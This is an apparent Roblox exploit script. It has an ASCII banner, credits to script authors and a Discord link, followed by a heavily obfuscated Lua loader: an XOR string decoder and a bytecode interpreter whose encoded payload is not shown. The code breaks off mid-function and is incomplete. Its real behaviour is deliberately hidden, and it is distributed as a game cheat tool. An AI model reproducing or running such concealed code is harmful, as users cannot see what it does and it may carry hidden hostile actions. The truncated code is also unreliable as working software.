--[[

          _____                   _______                   _____                    _____                    _____                _____                    _____                    _____                    _____          
         /\    \                 /::\    \                 /\    \                  /\    \                  /\    \              |\    \                  /\    \                  /\    \                  /\    \         
        /::\____\               /::::\    \               /::\____\                /::\____\                /::\    \             |:\____\                /::\____\                /::\____\                /::\    \        
       /::::|   |              /::::::\    \             /::::|   |               /:::/    /               /::::\    \            |::|   |               /:::/    /               /:::/    /               /::::\    \       
      /:::::|   |             /::::::::\    \           /:::::|   |              /:::/    /               /::::::\    \           |::|   |              /:::/    /               /:::/    /               /::::::\    \      
     /::::::|   |            /:::/~~\:::\    \         /::::::|   |             /:::/    /               /:::/\:::\    \          |::|   |             /:::/    /               /:::/    /               /:::/\:::\    \     
    /:::/|::|   |           /:::/    \:::\    \       /:::/|::|   |            /:::/____/               /:::/__\:::\    \         |::|   |            /:::/____/               /:::/    /               /:::/__\:::\    \    
   /:::/ |::|   |          /:::/    / \:::\    \     /:::/ |::|   |           /::::\    \              /::::\   \:::\    \        |::|   |           /::::\    \              /:::/    /               /::::\   \:::\    \   
  /:::/  |::|___|______   /:::/____/   \:::\____\   /:::/  |::|   | _____    /::::::\____\________    /::::::\   \:::\    \       |::|___|______    /::::::\    \   _____    /:::/    /      _____    /::::::\   \:::\    \  
 /:::/   |::::::::\    \ |:::|    |     |:::|    | /:::/   |::|   |/\    \  /:::/\:::::::::::\    \  /:::/\:::\   \:::\    \      /::::::::\    \  /:::/\:::\    \ /\    \  /:::/____/      /\    \  /:::/\:::\   \:::\ ___\ 
/:::/    |:::::::::\____\|:::|____|     |:::|    |/:: /    |::|   /::\____\/:::/  |:::::::::::\____\/:::/__\:::\   \:::\____\    /::::::::::\____\/:::/  \:::\    /::\____\|:::|    /      /::\____\/:::/__\:::\   \:::|    |
\::/    / ~~~~~/:::/    / \:::\    \   /:::/    / \::/    /|::|  /:::/    /\::/   |::|~~~|~~~~~     \:::\   \:::\   \::/    /   /:::/~~~~/~~      \::/    \:::\  /:::/    /|:::|____\     /:::/    /\:::\   \:::\  /:::|____|
 \/____/      /:::/    /   \:::\    \ /:::/    /   \/____/ |::| /:::/    /  \/____|::|   |           \:::\   \:::\   \/____/   /:::/    /          \/____/ \:::\/:::/    /  \:::\    \   /:::/    /  \:::\   \:::\/:::/    / 
             /:::/    /     \:::\    /:::/    /            |::|/:::/    /         |::|   |            \:::\   \:::\    \      /:::/    /                    \::::::/    /    \:::\    \ /:::/    /    \:::\   \::::::/    /  
            /:::/    /       \:::\__/:::/    /             |::::::/    /          |::|   |             \:::\   \:::\____\    /:::/    /                      \::::/    /      \:::\    /:::/    /      \:::\   \::::/    /   
           /:::/    /         \::::::::/    /              |:::::/    /           |::|   |              \:::\   \::/    /    \::/    /                       /:::/    /        \:::\__/:::/    /        \:::\  /:::/    /    
          /:::/    /           \::::::/    /               |::::/    /            |::|   |               \:::\   \/____/      \/____/                       /:::/    /          \::::::::/    /          \:::\/:::/    /     
         /:::/    /             \::::/    /                /:::/    /             |::|   |                \:::\    \                                       /:::/    /            \::::::/    /            \::::::/    /      
        /:::/    /               \::/____/                /:::/    /              \::|   |                 \:::\____\                                     /:::/    /              \::::/    /              \::::/    /       
        \::/    /                 ~~                      \::/    /                \:|   |                  \::/    /                                     \::/    /                \::/____/                \::/____/        
         \/____/                                           \/____/                  \|___|                   \/____/                                       \/____/                  ~~                       ~~              
                                                                                                                                                                                                                             

 							 _________            .__        __     _____                 __                  ______   ________
 							/   _____/ ___________|__|______/  |_  /     \   ____   ____ |  | __ ____ ___.__./  __  \ /  _____/
							 \_____  \_/ ___\_  __ \  \____ \   __\/  \ /  \ /  _ \ /    \|  |/ // __ <   |  |>      </   __  \ 
							 /        \  \___|  | \/  |  |_> >  | /    Y    (  <_> )   |  \    <\  ___/\___  /   --   \  |__\  \
							/_______  /\___  >__|  |__|   __/|__| \____|__  /\____/|___|  /__|_ \\___  > ____\______  /\_____  /
       							 \/     \/         |__|                \/            \/     \/    \/\/           \/       \/ 
Thanks, everyone! CREDITS: EdgeIY, CMD-X, FilteringEnabled, GhostPlayer352, rblxscriptsnet, debug420, AlexR32, AZYsGithub , xtebite#6500, Aim, Cli, rang#1234, Riptxde, rouxhaver , ScriptMonkey86, Fates
Join My Discord! https://discord.gg/A8Dkfy9w
]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v24, v25)
		local v26 = 0;
		local v27;
		while true do
			if (v26 == 1) then
				return v5(v27);
			end
			if (v26 == 0) then
				v27 = {};
				for v44 = 1, #v24 do
					v6(v27, v0(v4(v1(v2(v24, v44, v44 + 1)), v1(v2(v25, 1 + ((v44 - 1) % #v25), 1 + ((v44 - 1) % #v25) + 1))) % 256));
				end
				v26 = 1;
			end
		end
	end
	local v8 = tonumber;
	local v9 = string.byte;
	local v10 = string.char;
	local v11 = string.sub;
	local v12 = string.gsub;
	local v13 = string.rep;
	local v14 = table.concat;
	local v15 = table.insert;
	local v16 = math.ldexp;
	local v17 = getfenv or function()
		return _ENV;
	end;
	local v18 = setmetatable;
	local v19 = pcall;
	local v20 = select;
	local v21 = unpack or table.unpack;
	local v22 = tonumber;
	local function v23(v28, v29, ...)
		local v30 = 0;
		local v31;
		local v32;
		local v33;
		local v34;
		local v35;
		local v36;
		local v37;
		local v38;
		local v39;
		local v40;
		local v41;
		local v42;
		local v43;
		while true do
			if (v30 == 1) then
				v35 = nil;
				v36 = nil;
				v37 = nil;
				v38 = nil;
				v30 = 2;
			end
			if (2 == v30) then
				v39 = nil;
				v40 = nil;
				v41 = nil;
				v42 = nil;
				v30 = 3;
			end
			if (v30 == 0) then
				v31 = 0;
				v32 = nil;
				v33 = nil;
				v34 = nil;
				v30 = 1;
			end
			if (v30 == 3) then
				v43 = nil;
				while true do
					local v45 = 0;
					while true do
						if (2 == v45) then
							if (v31 == 3) then
								local v46 = 0;
								while true do
									if (1 == v46) then
										v38 = nil;
										v31 = 4;
										break;
									end
									if (v46 == 0) then
										v37 = nil;
										function v37()
											local v54 = 0;
											local v55;
											local v56;
											local v57;
											local v58;
											local v59;
											while true do
												if (v54 == 0) then
													v55 = 0;
													v56 = nil;
													v54 = 1;
												end
												if (v54 == 1) then
													v57 = nil;
													v58 = nil;
													v54 = 2;
												end
												if (v54 == 2) then
													v59 = nil;
													while true do
														local v111 = 0;
														while true do
															if (v111 == 0) then
																if (v55 == 1) then
																	return (v59 * 16777216) + (v58 * 65536) + (v57 * 256) + v56;
																end
																if (v55 == 0) then
																	local v139 = 0;
																	while true do
																		if (v139 == 1) then
																			v55 = 1;
																			break;
																		end
																		if (v139 == 0) then
																			v56, v57, v58, v59 = v9(v28, v32, v32 + 3);
																			v32 = v32 + 4;
																			v139 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v46 = 1;
									end
								end
							end
							if (v31 == 2) then
								local v47 = 0;
								while true do
									if (v47 == 1) then
										function v36()
											local v60 = 0;
											local v61;
											local v62;
											while true do
												if (0 == v60) then
													v61, v62 = v9(v28, v32, v32 + 2);
													v32 = v32 + 2;
													v60 = 1;
												end
												if (1 == v60) then
													return (v62 * 256) + v61;
												end
											end
										end
										v31 = 3;
										break;
									end
									if (0 == v47) then
										function v35()
											local v63 = 0;
											local v64;
											local v65;
											while true do
												if (v63 == 0) then
													v64 = 0;
													v65 = nil;
													v63 = 1;
												end
												if (1 == v63) then
													while true do
														local v112 = 0;
														while true do
															if (v112 == 0) then
																if (v64 == 1) then
																	return v65;
																end
																if (v64 == 0) then
																	local v140 = 0;
																	while true do
																		if (v140 == 0) then
																			v65 = v9(v28, v32, v32);
																			v32 = v32 + (431 - (44 + 386));
																			v140 = 1;
																		end
																		if (v140 == 1) then
																			v64 = 1;
																			break;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v36 = nil;
										v47 = 1;
									end
								end
							end
							v45 = 3;
						end
						if (v45 == 3) then
							if (v31 == 4) then
								local v48 = 0;
								while true do
									if (v48 == 0) then
										function v38()
											local v66 = 0;
											local v67;
											local v68;
											local v69;
											local v70;
											local v71;
											local v72;
											local v73;
											while true do
												if (v66 == 1) then
													v69 = nil;
													v70 = nil;
													v66 = 2;
												end
												if (v66 == 2) then
													v71 = nil;
													v72 = nil;
													v66 = 3;
												end
												if (3 == v66) then
													v73 = nil;
													while true do
														local v113 = 0;
														while true do
															if (1 == v113) then
																if (v67 == 2) then
																	local v141 = 0;
																	while true do
																		if (v141 == 1) then
																			v67 = 3;
																			break;
																		end
																		if (0 == v141) then
																			v72 = v34(v69, 21, 31);
																			v73 = ((v34(v69, 32) == 1) and -1) or (1 + 0);
																			v141 = 1;
																		end
																	end
																end
																if (v67 == 0) then
																	local v142 = 0;
																	while true do
																		if (v142 == 1) then
																			v67 = 1;
																			break;
																		end
																		if (v142 == 0) then
																			v68 = v37();
																			v69 = v37();
																			v142 = 1;
																		end
																	end
																end
																break;
															end
															if (0 == v113) then
																if (v67 == 1) then
																	local v143 = 0;
																	while true do
																		if (0 == v143) then
																			v70 = 1;
																			v71 = (v34(v69, 1, 20) * ((621 - (555 + 64)) ^ 32)) + v68;
																			v143 = 1;
																		end
																		if (v143 == 1) then
																			v67 = 2;
																			break;
																		end
																	end
																end
																if (v67 == 3) then
																	local v144 = 0;
																	while true do
																		if (v144 == 0) then
																			if (v72 == 0) then
																				if (v71 == 0) then
																					return v73 * 0;
																				else
																					local v167 = 0;
																					local v168;
																					while true do
																						if (v167 == 0) then
																							v168 = 0;
																							while true do
																								if (v168 == 0) then
																									v72 = 1;
																									v70 = 0 + 0;
																									break;
																								end
																							end
																							break;
																						end
																					end
																				end
																			elseif (v72 == 2047) then
																				return ((v71 == 0) and (v73 * (1 / 0))) or (v73 * NaN);
																			end
																			return v16(v73, v72 - 1023) * (v70 + (v71 / (2 ^ (824 - (201 + 571)))));
																		end
																	end
																end
																v113 = 1;
															end
														end
													end
													break;
												end
												if (v66 == 0) then
													v67 = 0;
													v68 = nil;
													v66 = 1;
												end
											end
										end
										v39 = nil;
										v48 = 1;
									end
									if (v48 == 1) then
										function v39(v74)
											local v75 = 0;
											local v76;
											local v77;
											while true do
												if (v75 == 3) then
													return v14(v77);
												end
												if (v75 == 1) then
													v76 = v11(v28, v32, (v32 + v74) - 1);
													v32 = v32 + v74;
													v75 = 2;
												end
												if (v75 == 0) then
													v76 = nil;
													if not v74 then
														local v132 = 0;
														while true do
															if (v132 == 0) then
																v74 = v37();
																if (v74 == 0) then
																	return "";
																end
																break;
															end
														end
													end
													v75 = 1;
												end
												if (v75 == 2) then
													v77 = {};
													for v114 = 1, #v76 do
														v77[v114] = v10(v9(v11(v76, v114, v114)));
													end
													v75 = 3;
												end
											end
										end
										v31 = 5;
										break;
									end
								end
							end
							if (v31 == 6) then
								local v49 = 0;
								while true do
									if (v49 == 1) then
										v43 = nil;
										v31 = 7;
										break;
									end
									if (v49 == 0) then
										v42 = nil;
										function v42()
											local v78 = 0;
											local v79;
											local v80;
											local v81;
											local v82;
											local v83;
											local v84;
											local v85;
											while true do
												if (2 == v78) then
													v83 = nil;
													v84 = nil;
													v78 = 3;
												end
												if (v78 == 0) then
													v79 = 0;
													v80 = nil;
													v78 = 1;
												end
												if (1 == v78) then
													v81 = nil;
													v82 = nil;
													v78 = 2;
												end
												if (v78 == 3) then
													v85 = nil;
													while true do
														local v116 = 0;
														while true do
															if (1 == v116) then
																if (v79 == 2) then
																	local v145 = 0;
																	while true do
																		if (v145 == 0) then
																			for v156 = 1, v84 do
																				local v157 = 0;
																				local v158;
																				local v159;
																				while true do
																					if (v157 == 1) then
																						if (v158 == (4 - 3)) then
																							v159 = v35() ~= 0;
																						elseif (v158 == 2) then
																							v159 = v38();
																						elseif (v158 == 3) then
																							v159 = v39();
																						end
																						v85[v156] = v159;
																						break;
																					end
																					if (v157 == 0) then
																						v158 = v35();
																						v159 = nil;
																						v157 = 1;
																					end
																				end
																			end
																			v83[3] = v35();
																			v145 = 1;
																		end
																		if (v145 == 1) then
																			for v160 = 1, v37() do
																				local v161 = 0;
																				local v162;
																				local v163;
																				while true do
																					if (v161 == 0) then
																						v162 = 0;
																						v163 = nil;
																						v161 = 1;
																					end
																					if (v161 == 1) then
																						while true do
																							if (v162 == 0) then
																								v163 = v35();
																								if (v34(v163, 1, 1) == (0 + 0)) then
																									local v172 = 0;
																									local v173;
																									local v174;
																									local v175;
																									local v176;
																									while true do
																										if (v172 == 1) then
																											v175 = nil;
																											v176 = nil;
																											v172 = 2;
																										end
																										if (v172 == 2) then
																											while true do
																												if (v173 == 2) then
																													local v286 = 0;
																													while true do
																														if (v286 == 1) then
																															v173 = 3;
																															break;
																														end
																														if (0 == v286) then
																															if (v34(v175, 1, 1) == 1) then
																																v176[2] = v85[v176[2]];
																															end
																															if (v34(v175, 2, 2) == 1) then
																																v176[3] = v85[v176[3]];
																															end
																															v286 = 1;
																														end
																													end
																												end
																												if (v173 == 1) then
																													local v287 = 0;
																													while true do
																														if (v287 == 1) then
																															v173 = 2;
																															break;
																														end
																														if (v287 == 0) then
																															v176 = {v36(),v36(),nil,nil};
																															if (v174 == 0) then
																																local v406 = 0;
																																while true do
																																	if (v406 == 0) then
																																		v176[3] = v36();
																																		v176[863 - (814 + 45)] = v36();
																																		break;
																																	end
																																end
																															elseif (v174 == 1) then
																																v176[3] = v37();
																															elseif (v174 == (4 - 2)) then
																																v176[3] = v37() - (2 ^ 16);
																															elseif (v174 == (1 + 2)) then
																																local v509 = 0;
																																while true do
																																	if (v509 == 0) then
																																		v176[3] = v37() - (2 ^ (584 - (367 + 201)));
																																		v176[2 + 2] = v36();
																																		break;
																																	end
																																end
																															end
																															v287 = 1;
																														end
																													end
																												end
																												if (v173 == 3) then
																													if (v34(v175, 3, 930 - (214 + 713)) == 1) then
																														v176[4] = v85[v176[2 + 2]];
																													end
																													v80[v160] = v176;
																													break;
																												end
																												if (v173 == 0) then
																													local v289 = 0;
																													while true do
																														if (1 == v289) then
																															v173 = 1;
																															break;
																														end
																														if (v289 == 0) then
																															v174 = v34(v163, 2, 10 - 7);
																															v175 = v34(v163, 4, 6);
																															v289 = 1;
																														end
																													end
																												end
																											end
																											break;
																										end
																										if (v172 == 0) then
																											v173 = 0;
																											v174 = nil;
																											v172 = 1;
																										end
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v79 = 3;
																			break;
																		end
																	end
																end
																if (v79 == 3) then
																	local v146 = 0;
																	while true do
																		if (v146 == 0) then
																			for v164 = 1, v37() do
																				v81[v164 - 1] = v42();
																			end
																			return v83;
																		end
																	end
																end
																break;
															end
															if (0 == v116) then
																if (v79 == 0) then
																	local v147 = 0;
																	while true do
																		if (v147 == 1) then
																			v82 = {};
																			v79 = 1;
																			break;
																		end
																		if (v147 == 0) then
																			v80 = {};
																			v81 = {};
																			v147 = 1;
																		end
																	end
																end
																if (v79 == 1) then
																	local v148 = 0;
																	while true do
																		if (v148 == 1) then
																			v85 = {};
																			v79 = 2;
																			break;
																		end
																		if (v148 == 0) then
																			v83 = {v80,v81,nil,v82};
																			v84 = v37();
																			v148 = 1;
																		end
																	end
																end
																v116 = 1;
															end
														end
													end
													break;
												end
											end
										end
										v49 = 1;
									end
								end
							end
							break;
						end
						if (v45 == 0) then
							if (v31 == 0) then
								local v50 = 0;
								while true do
									if (v50 == 1) then
										v28 = v12(v11(v28, 5), v7("\155\0", "\181\46\73\186\85\212"), function(v86)
											if (v9(v86, 2) == (139 - 60)) then
												local v97 = 0;
												local v98;
												while true do
													if (v97 == 0) then
														v98 = 0;
														while true do
															if (v98 == 0) then
																local v133 = 0;
																while true do
																	if (v133 == 0) then
																		v33 = v8(v11(v86, 1, 2 - 1));
																		return "";
																	end
																end
															end
														end
														break;
													end
												end
											else
												local v99 = 0;
												local v100;
												local v101;
												while true do
													if (v99 == 1) then
														while true do
															if (v100 == 0) then
																v101 = v10(v8(v86, 45 - 29));
																if v33 then
																	local v149 = 0;
																	local v150;
																	while true do
																		if (v149 == 0) then
																			v150 = v13(v101, v33);
																			v33 = nil;
																			v149 = 1;
																		end
																		if (v149 == 1) then
																			return v150;
																		end
																	end
																else
																	return v101;
																end
																break;
															end
														end
														break;
													end
													if (0 == v99) then
														v100 = 0;
														v101 = nil;
														v99 = 1;
													end
												end
											end
										end);
										v31 = 1;
										break;
									end
									if (v50 == 0) then
										v32 = 1;
										v33 = nil;
										v50 = 1;
									end
								end
							end
							if (v31 == 1) then
								local v51 = 0;
								while true do
									if (v51 == 0) then
										v34 = nil;
										function v34(v87, v88, v89)
											if v89 then
												local v102 = 0;
												local v103;
												local v104;
												while true do
													if (v102 == 1) then
														while true do
															if (v103 == 0) then
																local v134 = 0;
																while true do
																	if (v134 == 0) then
																		v104 = (v87 / (2 ^ (v88 - 1))) % (2 ^ (((v89 - (1 - 0)) - (v88 - 1)) + 1));
																		return v104 - (v104 % 1);
																	end
																end
															end
														end
														break;
													end
													if (v102 == 0) then
														v103 = 0;
														v104 = nil;
														v102 = 1;
													end
												end
											else
												local v105 = 0;
												local v106;
												local v107;
												while true do
													if (v105 == 1) then
														while true do
															if (v106 == 0) then
																local v135 = 0;
																while true do
																	if (v135 == 0) then
																		v107 = (4 - 2) ^ (v88 - 1);
																		return (((v87 % (v107 + v107)) >= v107) and 1) or 0;
																	end
																end
															end
														end
														break;
													end
													if (v105 == 0) then
														v106 = 0;
														v107 = nil;
														v105 = 1;
													end
												end
											end
										end
										v51 = 1;
									end
									if (v51 == 1) then
										v35 = nil;
										v31 = 2;
										break;
									end
								end
							end
							v45 = 1;
						end
						if (v45 == 1) then
							if (v31 == 7) then
								local v52 = 0;
								while true do
									if (v52 == 0) then
										function v43(v90, v91, v92)
											local v93 = 0;
											local v94;
											local v95;
											local v96;
											while true do
												if (v93 == 1) then
													v96 = v90[3];
													return function(...)
														local v117 = 0;
														local v118;
														local v119;
														local v120;
														local v121;
														local v122;
														local v123;
														local v124;
														local v125;
														local v126;
														local v127;
														local v128;
														local v129;
														local v130;
														local v131;
														while true do
															if (1 == v117) then
																v122 = 1;
																v123 = -1;
																v124 = {};
																v125 = {...};
																v117 = 2;
															end
															if (v117 == 2) then
																v126 = v20("#", ...) - 1;
																v127 = {};
																v128 = {};
																for v136 = 0, v126 do
																	if (v136 >= v120) then
																		v124[v136 - v120] = v125[v136 + 1];
																	else
																		v128[v136] = v125[v136 + 1];
																	end
																end
																v117 = 3;
															end
															if (v117 == 3) then
																v129 = (v126 - v120) + 1;
																v130 = nil;
																v131 = nil;
																while true do
																	local v137 = 0;
																	local v138;
																	while true do
																		if (0 == v137) then
																			v138 = 0;
																			while true do
																				if (1 == v138) then
																					if (v131 <= 39) then
																						if (v131 <= (33 - 14)) then
																							if (v131 <= (1089 - (1020 + 60))) then
																								if (v131 <= 4) then
																									if (v131 <= 1) then
																										if (v131 == 0) then
																											local v177 = 0;
																											local v178;
																											local v179;
																											while true do
																												if (v177 == 0) then
																													v178 = 0;
																													v179 = nil;
																													v177 = 1;
																												end
																												if (v177 == 1) then
																													while true do
																														if (v178 == 0) then
																															v179 = v130[2];
																															do
																																return v128[v179](v21(v128, v179 + 1, v130[1426 - (630 + 793)]));
																															end
																															break;
																														end
																													end
																													break;
																												end
																											end
																										elseif (v128[v130[2]] == v130[4]) then
																											v122 = v122 + 1;
																										else
																											v122 = v130[3];
																										end
																									elseif (v131 <= 2) then
																										if not v128[v130[6 - 4]] then
																											v122 = v122 + 1;
																										else
																											v122 = v130[14 - 11];
																										end
																									elseif (v131 > 3) then
																										if (v130[2] == v128[v130[4]]) then
																											v122 = v122 + 1 + 0;
																										else
																											v122 = v130[3];
																										end
																									elseif v128[v130[1 + 1]] then
																										v122 = v122 + 1;
																									else
																										v122 = v130[3];
																									end
																								elseif (v131 <= 6) then
																									if (v131 == 5) then
																										local v180 = 0;
																										local v181;
																										local v182;
																										local v183;
																										local v184;
																										local v185;
																										while true do
																											if (2 == v180) then
																												v185 = nil;
																												while true do
																													if (2 == v181) then
																														for v437 = v182, v123 do
																															local v438 = 0;
																															local v439;
																															while true do
																																if (v438 == 0) then
																																	v439 = 0;
																																	while true do
																																		if (v439 == 0) then
																																			v185 = v185 + 1;
																																			v128[v437] = v183[v185];
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																														break;
																													end
																													if (v181 == 1) then
																														local v408 = 0;
																														while true do
																															if (v408 == 1) then
																																v181 = 2;
																																break;
																															end
																															if (v408 == 0) then
																																v123 = (v184 + v182) - 1;
																																v185 = 0;
																																v408 = 1;
																															end
																														end
																													end
																													if (v181 == 0) then
																														local v409 = 0;
																														while true do
																															if (v409 == 1) then
																																v181 = 1;
																																break;
																															end
																															if (v409 == 0) then
																																v182 = v130[2];
																																v183, v184 = v121(v128[v182](v21(v128, v182 + (878 - (282 + 595)), v130[3])));
																																v409 = 1;
																															end
																														end
																													end
																												end
																												break;
																											end
																											if (0 == v180) then
																												v181 = 0;
																												v182 = nil;
																												v180 = 1;
																											end
																											if (v180 == 1) then
																												v183 = nil;
																												v184 = nil;
																												v180 = 2;
																											end
																										end
																									else
																										local v186 = 0;
																										local v187;
																										local v188;
																										local v189;
																										local v190;
																										while true do
																											if (v186 == 0) then
																												v187 = 0;
																												v188 = nil;
																												v186 = 1;
																											end
																											if (v186 == 1) then
																												v189 = nil;
																												v190 = nil;
																												v186 = 2;
																											end
																											if (v186 == 2) then
																												while true do
																													if (1 == v187) then
																														local v410 = 0;
																														while true do
																															if (v410 == 0) then
																																v190 = {};
																																v189 = v18({}, {[v7("\205\230\81\204\133\19\230", "\146\185\56\162\225\118\158\89")]=function(v477, v478)
																																	local v479 = 0;
																																	local v480;
																																	while true do
																																		if (v479 == 0) then
																																			v480 = v190[v478];
																																			return v480[1][v480[2]];
																																		end
																																	end
																																end,[v7("\53\231\82\0\215\166\4\220\89\29", "\106\184\60\101\160\207")]=function(v481, v482, v483)
																																	local v484 = 0;
																																	local v485;
																																	while true do
																																		if (v484 == 0) then
																																			v485 = v190[v482];
																																			v485[1][v485[2]] = v483;
																																			break;
																																		end
																																	end
																																end});
																																v410 = 1;
																															end
																															if (v410 == 1) then
																																v187 = 2;
																																break;
																															end
																														end
																													end
																													if (v187 == 0) then
																														local v411 = 0;
																														while true do
																															if (v411 == 0) then
																																v188 = v119[v130[3]];
																																v189 = nil;
																																v411 = 1;
																															end
																															if (v411 == 1) then
																																v187 = 1;
																																break;
																															end
																														end
																													end
																													if (v187 == 2) then
																														for v440 = 1, v130[1751 - (760 + 987)] do
																															local v441 = 0;
																															local v442;
																															local v443;
																															while true do
																																if (v441 == 1) then
																																	while true do
																																		if (v442 == 0) then
																																			local v525 = 0;
																																			while true do
																																				if (1 == v525) then
																																					v442 = 1;
																																					break;
																																				end
																																				if (v525 == 0) then
																																					v122 = v122 + 1;
																																					v443 = v118[v122];
																																					v525 = 1;
																																				end
																																			end
																																		end
																																		if (v442 == 1) then
																																			if (v443[1] == 57) then
																																				v190[v440 - 1] = {v128,v443[1916 - (1789 + 124)]};
																																			else
																																				v190[v440 - 1] = {v91,v443[3]};
																																			end
																																			v127[#v127 + (1638 - (1523 + 114))] = v190;
																																			break;
																																		end
																																	end
																																	break;
																																end
																																if (v441 == 0) then
																																	v442 = 0;
																																	v443 = nil;
																																	v441 = 1;
																																end
																															end
																														end
																														v128[v130[2]] = v43(v188, v189, v92);
																														break;
																													end
																												end
																												break;
																											end
																										end
																									end
																								elseif (v131 <= (7 + 0)) then
																									local v191 = 0;
																									local v192;
																									local v193;
																									local v194;
																									local v195;
																									while true do
																										if (v191 == 1) then
																											v194 = nil;
																											v195 = nil;
																											v191 = 2;
																										end
																										if (v191 == 0) then
																											v192 = 0;
																											v193 = nil;
																											v191 = 1;
																										end
																										if (v191 == 2) then
																											while true do
																												if (v192 == 1) then
																													v195 = v128[v193 + 2];
																													if (v195 > 0) then
																														if (v194 > v128[v193 + 1]) then
																															v122 = v130[769 - (745 + 21)];
																														else
																															v128[v193 + 3] = v194;
																														end
																													elseif (v194 < v128[v193 + (1066 - (68 + 997))]) then
																														v122 = v130[3];
																													else
																														v128[v193 + 3] = v194;
																													end
																													break;
																												end
																												if (0 == v192) then
																													local v414 = 0;
																													while true do
																														if (v414 == 0) then
																															v193 = v130[2 - 0];
																															v194 = v128[v193];
																															v414 = 1;
																														end
																														if (1 == v414) then
																															v192 = 1;
																															break;
																														end
																													end
																												end
																											end
																											break;
																										end
																									end
																								elseif (v131 == 8) then
																									local v292 = 0;
																									local v293;
																									local v294;
																									local v295;
																									local v296;
																									while true do
																										if (v292 == 1) then
																											v295 = nil;
																											v296 = nil;
																											v292 = 2;
																										end
																										if (v292 == 2) then
																											while true do
																												if (v293 == 1) then
																													v296 = v128[v294 + 1 + 1];
																													if (v296 > 0) then
																														if (v295 > v128[v294 + (2 - 1)]) then
																															v122 = v130[3];
																														else
																															v128[v294 + 3] = v295;
																														end
																													elseif (v295 < v128[v294 + 1]) then
																														v122 = v130[3];
																													else
																														v128[v294 + 3] = v295;
																													end
																													break;
																												end
																												if (v293 == 0) then
																													local v457 = 0;
																													while true do
																														if (v457 == 0) then
																															v294 = v130[2];
																															v295 = v128[v294];
																															v457 = 1;
																														end
																														if (v457 == 1) then
																															v293 = 1;
																															break;
																														end
																													end
																												end
																											end
																											break;
																										end
																										if (0 == v292) then
																											v293 = 0;
																											v294 = nil;
																											v292 = 1;
																										end
																									end
																								else
																									local v297 = 0;
																									local v298;
																									local v299;
																									while true do
																										if (v297 == 1) then
																											while true do
																												if (v298 == 0) then
																													v299 = v130[2];
																													v128[v299](v128[v299 + 1]);
																													break;
																												end
																											end
																											break;
																										end
																										if (v297 == 0) then
																											v298 = 0;
																											v299 = nil;
																											v297 = 1;
																										end
																									end
																								end
																							elseif (v131 <= 14) then
																								if (v131 <= 11) then
																									if (v131 > 10) then
																										local v196 = 0;
																										local v197;
																										local v198;
																										local v199;
																										local v200;
																										while true do
																											if (2 == v196) then
																												while true do
																													if (v197 == 0) then
																														local v415 = 0;
																														while true do
																															if (v415 == 0) then
																																v198 = v119[v130[3]];
																																v199 = nil;
																																v415 = 1;
																															end
																															if (v415 == 1) then
																																v197 = 1;
																																break;
																															end
																														end
																													end
																													if (v197 == 1) then
																														local v416 = 0;
																														while true do
																															if (v416 == 0) then
																																v200 = {};
																																v199 = v18({}, {[v7("\73\131\56\140\120\115\164", "\22\220\81\226\28")]=function(v490, v491)
																																	local v492 = 0;
																																	local v493;
																																	local v494;
																																	while true do
																																		if (v492 == 0) then
																																			v493 = 0;
																																			v494 = nil;
																																			v492 = 1;
																																		end
																																		if (v492 == 1) then
																																			while true do
																																				if (v493 == 0) then
																																					local v544 = 0;
																																					while true do
																																						if (v544 == 0) then
																																							v494 = v200[v491];
																																							return v494[1][v494[2]];
																																						end
																																					end
																																				end
																																			end
																																			break;
																																		end
																																	end
																																end,[v7("\248\44\219\135\236\227\201\23\208\154", "\167\115\181\226\155\138")]=function(v495, v496, v497)
																																	local v498 = 0;
																																	local v499;
																																	local v500;
																																	while true do
																																		if (1 == v498) then
																																			while true do
																																				if (v499 == 0) then
																																					v500 = v200[v496];
																																					v500[1][v500[2]] = v497;
																																					break;
																																				end
																																			end
																																			break;
																																		end
																																		if (0 == v498) then
																																			v499 = 0;
																																			v500 = nil;
																																			v498 = 1;
																																		end
																																	end
																																end});
																																v416 = 1;
																															end
																															if (v416 == 1) then
																																v197 = 2;
																																break;
																															end
																														end
																													end
																													if (2 == v197) then
																														for v444 = 1, v130[4] do
																															local v445 = 0;
																															local v446;
																															local v447;
																															while true do
																																if (v445 == 0) then
																																	v446 = 0;
																																	v447 = nil;
																																	v445 = 1;
																																end
																																if (v445 == 1) then
																																	while true do
																																		if (v446 == 0) then
																																			local v527 = 0;
																																			while true do
																																				if (v527 == 1) then
																																					v446 = 1;
																																					break;
																																				end
																																				if (v527 == 0) then
																																					v122 = v122 + 1;
																																					v447 = v118[v122];
																																					v527 = 1;
																																				end
																																			end
																																		end
																																		if (1 == v446) then
																																			if (v447[1271 - (226 + 1044)] == 57) then
																																				v200[v444 - 1] = {v128,v447[3]};
																																			else
																																				v200[v444 - 1] = {v91,v447[12 - 9]};
																																			end
																																			v127[#v127 + 1] = v200;
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																														v128[v130[2]] = v43(v198, v199, v92);
																														break;
																													end
																												end
																												break;
																											end
																											if (0 == v196) then
																												v197 = 0;
																												v198 = nil;
																												v196 = 1;
																											end
																											if (v196 == 1) then
																												v199 = nil;
																												v200 = nil;
																												v196 = 2;
																											end
																										end
																									else
																										v128[v130[2]] = v92[v130[3]];
																									end
																								elseif (v131 <= 12) then
																									v128[v130[2]] = v130[120 - (32 + 85)];
																								elseif (v131 > 13) then
																									local v300 = 0;
																									local v301;
																									while true do
																										if (v300 == 0) then
																											v301 = v130[2];
																											v128[v301](v21(v128, v301 + 1, v123));
																											break;
																										end
																									end
																								else
																									local v302 = 0;
																									local v303;
																									local v304;
																									local v305;
																									while true do
																										if (1 == v302) then
																											v305 = v128[v303] + v304;
																											v128[v303] = v305;
																											v302 = 2;
																										end
																										if (v302 == 2) then
																											if (v304 > (0 + 0)) then
																												if (v305 <= v128[v303 + 1]) then
																													local v467 = 0;
																													local v468;
																													while true do
																														if (v467 == 0) then
																															v468 = 0;
																															while true do
																																if (v468 == 0) then
																																	v122 = v130[3];
																																	v128[v303 + (11 - 8)] = v305;
																																	break;
																																end
																															end
																															break;
																														end
																													end
																												end
																											elseif (v305 >= v128[v303 + 1 + 0]) then
																												local v469 = 0;
																												while true do
																													if (v469 == 0) then
